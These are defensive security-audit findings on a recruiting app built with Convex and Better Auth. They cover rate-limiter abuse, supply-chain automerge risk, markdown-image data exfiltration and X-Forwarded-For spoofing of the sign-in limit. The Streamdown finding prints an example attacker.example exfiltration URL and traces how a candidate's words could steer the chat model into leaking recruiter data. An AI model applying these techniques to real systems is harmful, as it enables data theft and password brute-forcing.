Sibling control, re-verified: `consumeWriteLimit` throws `not_found` on `!looksLikeToken(token)` at 267, and only then calls `consumeLimit(ctx, 'candidateWrite', token)` at 268.

Sibling control, re-verified: `logEvent` calls `resolveSessionByToken(ctx, token)` at 447 before `consumeLimit` at 448; `finish` does the same at 490 before 492; `start`, the segment mutations and `markSegmentFailed` resolve via `requireOpenSession` at 138, 251, 388 and 417 before their limiter calls.
`shareView: { kind: 'token bucket', rate: 120, period: MINUTE, capacity: 30 }` - a fresh key always succeeds on first use, so an unresolvable token never short-circuits before the component write.
`if (!looksLikeToken(token)) return { state: 'not_found', share: null }` - the shape gate lives inside resolveShare, i.e. downstream of the limiter for this one caller.
The `WRITES` array (lines 70-77) lists only `ctx.db.insert/patch/delete/replace` and `ctx.scheduler.runAfter/runAt`; a component mutation such as `rateLimiter.limit` is not a write for this audit.

`resolveShare` is in the `GUARDS` list, and it does precede the only counted write (`ctx.db.patch` at convex/shares.ts:287), so the CI gate `pnpm audit:access:check` reports recordView as guarded and the ordering inversion passes.
Convex strings are bounded only by the 1 MB total value size limit, so a single unauthenticated call can carry a key of that order.

'The trap we hit (4.8 GB on a 1 GB Free quota)' - records that this project's Convex deployment has run against a 1 GB Free-plan quota, establishing that deployment-wide resource consumption is a shared, operator-billed limit (the incident described there is bandwidth, not stored rows).

blockers: The @convex-dev/rate-limiter@0.3.2 component implementation is not readable offline, so the decisive fact - whether `limit()` inserts a durable row for a never-seen key, how large that row is, and whether any TTL, sweep or eviction removes it - cannot be established from source. Re-verified independently: `node_modules` is absent, and the pnpm store at /root/.local/share/pnpm/store/v10 contains exactly one index entry (pnpm@10.34.5 itself), so no copy of the package exists on this host; installation is prohibited.

Convex platform facts that bound the abuse rate are outside the repository: the maximum accepted function-argument size, any per-deployment call throttling applied to unauthenticated clients, and whether exceeding the storage quota refuses writes or simply bills the operator.
The convex-test / vitest suites cannot run without dependencies, so growth of the component's table under repeated unresolvable-token calls cannot be observed in this sandbox.

validation_plan.local: With dependencies installed on a throwaway checkout: (1) read node_modules/@convex-dev/rate-limiter's component `lib` rateLimit handler and confirm whether the first `ok` call for an unseen key inserts a document, and whether any TTL, cron or eviction removes it; (2) in a convex-test harness, call api.shares.recordView 1,000 times with distinct random 43-character base64url-shaped strings and once with a ~900 KiB string, none of which matches a reportShares row, then use t.run over the rateLimiter component's tables (or the component's own query functions) to count the surviving rows and their sizes. One persisted row per key, with no expiry, confirms the retained-resource claim; zero rows or an expiring row refutes it. Use only a local test deployment - never a real one.
validation_plan.deployment: On a staging (never production) Convex deployment, an owner opens the dashboard's rateLimiter component data view, then from the Functions runner calls shares.recordView with three distinct random strings that resolve to no share, waits past the 1-minute token-bucket period, and re-reads the component tables: rows keyed by those exact strings that are present and still present after the period demonstrate attacker-chosen persistent keys. Also note the deployment's plan and its storage/bandwidth quota behaviour on the billing page. No traffic to production and no share links are touched.

title: Renovate auto-merges patch/minor devDependency updates with no reviewer and no release-age cooldown, and those packages are executed by the production build that holds CONVEX_DEPLOY_KEY
description: renovate.json:13-18 grants `automerge: true` to every patch and minor update of a direct devDependency, gated only by green CI. Five of the packages covered by that rule execute during the build itself: vite (^8.0.16), typescript (^6.0.3), @tailwindcss/vite (^4.3.0), @vitejs/plugin-react (^6.0.2) and vite-tsconfig-paths (^6.1.1), the last three loaded as Vite plugins in vite.config.ts:3-5. package.json:16 runs `vite build && tsc --noEmit`, and package.json:15 wraps that in `npx convex deploy --cmd 'pnpm build:app'` whenever DEPLOY_CONVEX=true. README.md:112-149 and KNOWN_ISSUES.md:363-386 document the intended production topology: Scalingo auto-deploys every push to `main`, with DEPLOY_CONVEX=true and a production CONVEX_DEPLOY_KEY present in the build environment (KNOWN_ISSUES.md:383 states app env vars are available during the build phase). A malicious or hijacked patch release of any of those packages would therefore be merged into `main` and executed inside the production build process, holding the production Convex deploy key and controlling the emitted server bundle, without any human reading the diff. No cooldown exists at any layer: renovate.json sets no `minimumReleaseAge`, .npmrc holds only auto-install-peers/strict-peer-dependencies, and pnpm-workspace.yaml holds only `onlyBuiltDependencies`. That last setting is a real but non-blocking control - it stops install-time lifecycle scripts for these packages, yet vite and tsc are invoked directly by the build script and need no postinstall hook. The only gate is the CI `check` job (.github/workflows/ci.yml:12-33), which a payload dormant outside the deploy environment passes. No repository-stored reviewer requirement exists: .github contains only two workflow files, with no CODEOWNERS and no ruleset definition.
claimed_root_cause: renovate.json packageRules[1] auto-merges all devDependency patch/minor updates on green CI while no release-age cooldown is configured at any layer (no `minimumReleaseAge` in renovate.json, none in .npmrc, none in pnpm-workspace.yaml), and the set of packages that rule covers includes those executed by `pnpm build:app`, which the documented production topology runs with CONVEX_DEPLOY_KEY in its environment. The rule is scoped by dependency type rather than by whether the package runs in the deploy path.

trace.description: `"automerge": true` merges any green devDependency patch/minor PR with no human reviewer; the lower-trust actor is whoever can publish such a release to the public npm registry.
No `minimumReleaseAge` or equivalent cooldown appears anywhere in this file, so eligibility is decided on the weekly run with no waiting period after publication.
Contains only `auto-install-peers=true` and `strict-peer-dependencies=false`; no minimum-release-age setting at the package-manager layer.
Only `onlyBuiltDependencies: [esbuild, unrs-resolver]`. This blocks install-time lifecycle scripts for the packages in question but not their execution as build tools, and it sets no cooldown.

The only automated gate before automerge: `pnpm install --frozen-lockfile` then codegen check, access audit, lint, test and build (lines 26-33). It runs with `permissions: contents: read` (lines 8-9) and no secrets, so it neither exposes credentials nor detects a payload that stays dormant outside the deploy environment.

vite-tsconfig-paths (line 3), @tailwindcss/vite (line 4) and @vitejs/plugin-react (line 5) are imported and invoked (lines 13-19), so their code executes inside every `vite build`. All three are devDependencies covered by the automerge rule.

`if [ "$DEPLOY_CONVEX" = 'true' ]; then npx convex deploy --cmd-url-env-var-name VITE_CONVEX_URL --cmd 'pnpm build:app'; ...` - the build sub-process inherits the deploy environment, including CONVEX_DEPLOY_KEY.

Other rules in the same file (lines 19-44) deliberately disable automation for @tanstack/*, @convex-dev/better-auth, better-auth minors and the pnpm major, showing the automerge scope was chosen by dependency type, not by deploy-path exposure.

title: Assistant markdown is rendered by Streamdown with no image or link allowlist under a CSP that permits any https image, so model-authored markdown may give the recruiter's browser an outbound GET sink
description: Every assistant text part in the AI panel is handed verbatim to <Streamdown> (src/components/ai/AiPanel.tsx:127 -> src/components/ai-elements/message.tsx:324-333), which is spread only with className and children -- no allowedImagePrefixes, no allowedLinkPrefixes (message.tsx:331). The CSP served on every web-origin response allows img-src 'self' data: https: and connect-src 'self' https: wss: (src/lib/security-headers.ts:40, 42, applied by the Start middleware in src/start.ts:6-20), so the browser policy is not a preventing layer for a foreign https image. If Streamdown 2.5.0's defaults emit a markdown image with an arbitrary https URL, then a model response containing ![](https://attacker.example/?d=...) causes the recruiter's authenticated browser to issue a GET carrying whatever the model placed in that URL. What the chat model can place there is real: its tool results include candidate names, scores, recommendations, recruiter decisions and recruiter notes, and the full report free text (convex/recruiterTools.ts:98-108, 156-174). The lowest-trust write into that context is a candidate's spoken answer, which reaches the chat only after passing through the evaluation model's report strings (convex/pipeline.ts:596 -> convex/lib/prompts.ts:138-139 -> saved report), so this is an insecure-output-rendering sink rather than a demonstrated end-to-end injection. Verified as a source path; the decisive facts are the renderer's defaults and two model behaviours, neither observable here.
claimed_root_cause: MessageResponse spreads only className into Streamdown and never constrains the renderer to the app origin with allowedImagePrefixes / allowedLinkPrefixes (src/components/ai-elements/message.tsx:324-333), while the served CSP leaves img-src and connect-src open to any https origin (src/lib/security-headers.ts:40, 42). Model-authored markdown therefore has whatever outbound-resource authority the renderer's defaults grant it, and the application makes no decision of its own about that.

trace.description: The candidate's own transcribed speech (answer.text) is interpolated verbatim into the evaluation model's user prompt; convex/lib/prompts.ts:138-139 embeds it as 'What the candidate said: <transcript>'. This is the lowest-trust write that can reach the recruiter's chat context -- a candidate holds only a session token and no account.

saveReport persists the evaluation model's free-text output (executiveSummary, strengths, concerns, per-criterion rationale) built from that prompt. Zod validation and quote re-anchoring constrain the shape and the provenance of quotes, not the characters inside a string.

That report free text is returned to the chat model as tool output (summary at 162, strengths 163, concerns 164, per-criterion rationale 169), together with candidateName, recruiterDecision and recruiterNote (157, 171-172).

chatAgent.streamText generates the assistant reply over that context and saves the deltas to the thread (saveStreamDeltas, line 262); the reply is plain text the model composes, so it may contain markdown image or link syntax.
Each assistant part of type 'text' is passed verbatim as children to MessageResponse; no sanitisation, truncation or URL inspection happens in the app before this point.

renders that markdown in the recruiter's authenticated session with no allowedImagePrefixes or allowedLinkPrefixes; an emitted would be fetched by the browser, which img-src 'self' data: https: permits.

evidence.description: `import { Streamdown } from 'streamdown'` -- a third-party markdown renderer whose behaviour is not in this repository.

`{...props}` -- MessageResponse destructures only className (line 325) and forwards the rest; no call site anywhere in src/ supplies allowedImagePrefixes or allowedLinkPrefixes, so the renderer's defaults govern.
`return <MessageResponse key={i}>{part.text}</MessageResponse>` -- the only call site of MessageResponse; it passes raw model text.
`"img-src 'self' data: https:"` -- any https origin may be loaded as an image, so CSP does not block the outbound GET.
`"connect-src 'self' https: wss:"` -- no CSP obstacle to a foreign fetch either, should the renderer permit any element that performs one.
setResponseHeader applies securityHeaders() on every web-origin response through the Start request middleware, so the CSP above is the policy in force on the recruiter app pages.

`recruiterNote: session.recruiterNote ?? null` -- free-text recruiter notes, alongside recruiterDecision (171) and the report body (160-170), are in the chat model's context and are exactly the sort of data a URL-shaped exfiltration would carry.

The evaluation prompt instructs the model that every claim 'must rest on something the candidate actually said, quoted as closely as you can manage' -- the mechanism by which a phrase spoken by the candidate can be reproduced into report free text.

title: Better Auth's per-IP rate limit — the only brute-force control on password sign-in — may be keyed on a client-supplied X-Forwarded-For that the auth proxy forwards verbatim
description: src/routes/api/auth/$.ts rebuilds the upstream request with `headers: request.headers`, so any X-Forwarded-For, X-Real-IP or Forwarded header the caller sets travels unchanged to the Better Auth routes; GET and HEAD are passed through untouched. convex/auth.ts configures a rateLimit block whose customRules include '/sign-in/email': 5 per 60 s, and its advanced block sets no advanced.ipAddress.ipAddressHeaders, so Better Auth's default client-IP derivation decides the key. convex/rateLimiters.ts has no bucket for sign-in attempts — the application limiter covers invitations, chat, job import, candidate reads/writes, share views and the three e-mail senders (those keyed per normalised e-mail, so mail flooding stays bounded even if the per-IP rule is defeated) — which leaves the BA per-IP rule as the sole control on password guessing, exactly as KNOWN_ISSUES.md and TESTING.md A10 assume. If Better Auth takes the first comma-separated entry of a forwarded header by default, an attacker rotating that header per request would defeat the 5-per-60 s limit on /sign-in/email, and would also plant an arbitrary ipAddress on the session row that Active Sessions shows the user as a security signal. Whether it does is a library default, not a repository fact, and the vendored official Better Auth security skill points both ways on it.
claimed_root_cause: Client-controlled forwarding headers pass through src/routes/api/auth/$.ts without being stripped or replaced by the socket address, and convex/auth.ts leaves Better Auth's client-IP derivation on library defaults, so the key of the only sign-in brute-force limit may be chosen by the caller.

trace.description: Anonymous request to any /api/auth/* path, including whatever X-Forwarded-For, X-Real-IP or Forwarded header the caller chose to set.

`headers: request.headers` copies the inbound headers verbatim into the rebuilt upstream Request; nothing strips forwarding headers or injects the socket address, and GET/HEAD return the original request untouched at line 17.

'/sign-in/email': { window: 60, max: 5 } and the sibling per-path rules on lines 59-72 are keyed on Better Auth's derived client IP; the advanced block at line 76 sets useSecureCookies, cookiePrefix and cookie attributes only, and configures no ipAddress.ipAddressHeaders.

evidence.description: The application-level RateLimiter declares buckets for invitationCreate, magicLinkSend, verificationSend, passwordResetSend, chatSend, jobImport, candidateInvite, candidateRead, candidateWrite and shareView — and none for sign-in attempts — so the Better Auth per-IP rule is the only brute-force control on passwords. The three send buckets are keyed per normalised e-mail address (convex/auth.ts:116, 146, 301), which keeps mail flooding bounded independently of the IP key.

The advanced block sets useSecureCookies, cookiePrefix and defaultCookieAttributes only; there is no ipAddress configuration anywhere in the repository, so Better Auth's default IP derivation applies unmodified.

authComponent.registerRoutes(http, createAuth) publishes the same Better Auth routes on the Convex site origin, whose URL ships to the browser as VITE_CONVEX_SITE_URL. The /api/auth proxy is therefore not the only way to reach them: a caller can set the same headers on a request sent straight to that origin, which makes the Convex HTTP ingress, not the web tier's router, the decisive hop.

Documents that the project relies on Better Auth's per-endpoint limiter for /sign-in/email, /sign-up/email, /forgot-password, /reset-password, /sign-in/magic-link and the other sensitive paths, and that convex/rateLimiters.ts is a separate, application-level concern.
Check A10 verifies the limit by repeating attempts from a single client, which cannot reveal a key that follows a caller-chosen header.
session.ipAddress is rendered to the user in the Active Sessions list as a security signal, so a caller-chosen value would also be displayed there as if it were observed.

The vendored official Better Auth security skill says to enable trustedProxyHeaders only when behind a trusted reverse proxy, which cuts both ways: it may mean forwarded headers are ignored unless that flag is set (which would refute this candidate) or that the flag gates only some behaviours and not the rate-limit key. The vendored document is not pinned to 1.6.30 and is documentation rather than source, so it cannot settle the default.

blockers: better-auth@1.6.30 (pinned at pnpm-lock.yaml:2735) is absent from this machine — node_modules is missing, installation is prohibited, and the pnpm store holds only registry metadata — so its default client-IP derivation cannot be read: which headers it consults, whether it takes the first comma-separated entry, whether a default such as trustedProxyHeaders or disableIpTracking makes forwarded headers untrusted, and whether a null IP skips the rate-limit check entirely rather than falling back to a shared key.

@convex-dev/better-auth@0.12.2 is likewise absent, so it is not source-visible whether its react-start handler (ba.handler, src/routes/api/auth/$.ts:32) forwards every inbound header to the Convex site route or applies an allow-list that would drop forwarding headers before Better Auth sees them.

Deployment fact: whether the Convex HTTP ingress preserves, appends to, or overwrites a client-supplied X-Forwarded-For / X-Real-IP before the Better Auth route runs — and, on the proxied path only, whether the Scalingo router does the same. Because convex/http.ts:9 exposes the routes on the Convex site origin directly, the Convex ingress is the hop that decides this and it is outside the repository.

validation_plan.local: With node_modules available offline, first read better-auth's request-IP helper and rate-limiter to record the default header list, the comma-splitting behaviour, the trustedProxyHeaders/disableIpTracking defaults and what happens when no IP is derived. Then, entirely in-process with no network, run betterAuth with a memory adapter and rateLimit { enabled: true, storage: 'memory', customRules: { '/sign-in/email': { window: 60, max: 2 } } }, and call auth.handler four times with POST /sign-in/email for a dummy account and a wrong password, each request carrying a distinct x-forwarded-for value. No 429 on the fourth call confirms the key follows the caller's header; a 429 refutes the candidate. Repeat once with all four requests sharing one header value as the control, and once with no forwarding header at all to see whether the limit still applies when no IP can be derived.
validation_plan.deployment: Owner-observed on a non-production deployment, against a dummy account the owner created: from a single host the owner sends six sign-in attempts with a deliberately wrong password, each carrying a different X-Forwarded-For value, addressed to the Convex site origin (the BA routes registered at convex/http.ts:9) and then repeated through the /api/auth proxy, and records whether a 429 arrives by the sixth attempt in either case. Then the owner signs in once with X-Forwarded-For: 203.0.113.9 and reads the ipAddress shown for that session under Active Sessions. Nothing is sent to production and no real account is targeted.
